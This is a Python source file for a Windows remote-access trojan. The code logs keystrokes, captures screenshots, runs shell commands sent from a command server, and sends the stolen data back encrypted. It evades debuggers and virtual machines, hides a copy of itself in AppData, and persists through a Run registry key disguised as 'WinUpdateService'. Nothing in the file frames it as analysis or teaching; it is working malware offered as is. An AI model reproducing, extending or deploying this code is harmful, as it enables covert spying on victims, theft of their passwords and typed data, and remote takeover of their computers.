import os, sys, ctypes, hashlib, random, string, time, json, base64, socket, platform, subprocess, requests, psutil, winreg
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pynput import keyboard
from PIL import ImageGrab
import threading

# CONFIG
PASSWORD = "YourStrongPassword"
SERVER_URL = "http://127.0.0.1:5000/api"
KEY = hashlib.sha256(PASSWORD.encode()).digest()
HIDDEN_DIR = os.path.join(os.getenv("APPDATA"), ".cache")
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSISTENCE_NAME = "WinUpdateService"

# Globals
keylog_buffer = []
keylog_lock = threading.Lock()
MAX_KEYLOG_BATCH = 20
KEYLOG_FLUSH_TIME = 60
last_keylog_flush = time.time()


# UTILS
def encrypt(data): return AESGCM(KEY).encrypt(os.urandom(12), data, None) if False else _encrypt(data)
def _encrypt(data): nonce = os.urandom(12); return nonce + AESGCM(KEY).encrypt(nonce, data, None)

def decrypt(data): return AESGCM(KEY).decrypt(data[:12], data[12:], None)

def random_string(n=8): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def stealth_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Windows NT 10.0; WOW64)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ]),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }


# ANTI-ANALYSIS
def is_debugger_present(): return ctypes.windll.kernel32.IsDebuggerPresent() != 0
def is_running_in_vm():
    indicators = ["vbox", "vmware", "hyper-v", "virtual"]
    for indicator in indicators:
        if indicator in platform.system().lower() or indicator in platform.node().lower():
            return True
    for _, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.address.upper().startswith(("00:05:69", "00:0C:29", "00:1C:14", "00:50:56")):
                return True
    return False

def anti_analysis_delay_check():
    start = time.perf_counter()
    time.sleep(0.1)
    return (time.perf_counter() - start) < 0.09


# KEYLOGGING
def keylogger_thread():
    def on_press(key):
        with keylog_lock:
            try:
                if hasattr(key, "char") and key.char:
                    keylog_buffer.append(key.char)
                else:
                    keylog_buffer.append(f"[{key.name}]")
            except:
                pass
    keyboard.Listener(on_press=on_press).start()


def flush_keylog():
    global last_keylog_flush
    with keylog_lock:
        data = ''.join(keylog_buffer)
        keylog_buffer.clear()
    last_keylog_flush = time.time()
    return data


# MAIN FUNCTIONALITY
def take_screenshot():
    try:
        from io import BytesIO
        img = ImageGrab.grab()
        buf = BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except:
        return None


def send_result(client_id, action, result):
    payload = {"client_id": client_id, "action": action, "result": result, "timestamp": datetime.utcnow().isoformat()}
    try:
        enc = encrypt(json.dumps(payload).encode())
        requests.post(SERVER_URL, data=base64.b64encode(enc), headers=stealth_headers(), timeout=20)
    except:
        pass


def communicate_loop():
    client_id = f"{socket.gethostname()}_{os.getpid()}"
    keylogger_thread()
    while True:
        if is_debugger_present() or is_running_in_vm() or anti_analysis_delay_check():
            time.sleep(random.randint(600, 1200))
            continue

        keylog_data = ""
        if len(keylog_buffer) >= MAX_KEYLOG_BATCH or (time.time() - last_keylog_flush) > KEYLOG_FLUSH_TIME:
            keylog_data = flush_keylog()

        payload = {"client_id": client_id, "action": "heartbeat", "timestamp": datetime.utcnow().isoformat(), "keylog": keylog_data}
        enc = encrypt(json.dumps(payload).encode())
        try:
            resp = requests.post(SERVER_URL, data=base64.b64encode(enc), headers=stealth_headers(), timeout=20)
            enc_resp = base64.b64decode(resp.content)
            dec_resp = json.loads(decrypt(enc_resp))
            cmd = dec_resp.get("command")
            if cmd:
                handle_command(client_id, cmd)

        except:
            time.sleep(random.randint(30, 60))
        time.sleep(random.randint(45, 90))


def handle_command(client_id, cmd):
    if cmd == "exit" or cmd == "self_destruct":
        self_destruct()
    elif cmd.startswith("shell "):
        result = subprocess.getoutput(cmd[6:])
        send_result(client_id, "shell_result", result)
    elif cmd == "screenshot":
        img = take_screenshot()
        if img:
            send_result(client_id, "screenshot", base64.b64encode(img).decode())
        else:
            send_result(client_id, "error", "Screenshot failed.")
    elif cmd == "processes":
        processes = [p.info for p in psutil.process_iter(attrs=["pid", "name"])][:20]
        send_result(client_id, "process_list", json.dumps(processes))
    else:
        send_result(client_id, "error", f"Unknown command: {cmd}")


def run_stealth():
    mutex_name = "Global\\MyStealthMutex"
    if not create_mutex(mutex_name): sys.exit(0)

    dest_path = os.path.join(HIDDEN_DIR, os.path.basename(sys.executable))
    if sys.executable.lower() != dest_path.lower():
        new_path = copy_to_hidden()
        if new_path:
            set_persistence(new_path)
            subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)


def create_mutex(name):
    handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
    return handle != 0 and ctypes.GetLastError() != 183


def copy_to_hidden():
    if not os.path.exists(HIDDEN_DIR): os.makedirs(HIDDEN_DIR, exist_ok=True)
    exe_name = random_string(10) + ".exe"
    dest = os.path.join(HIDDEN_DIR, exe_name)
    if not os.path.exists(dest):
        try:
            import shutil
            shutil.copy2(sys.executable, dest)
            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)  # Hidden + System
            return dest
        except:
            return None
    return dest


def set_persistence(exe_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass


def self_destruct():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSISTENCE_NAME)
        winreg.CloseKey(key)
    except:
        pass
    try:
        os.remove(sys.executable)
    except:
        pass
    sys.exit(0)


if __name__ == "__main__":
    run_stealth()
    communicate_loop()
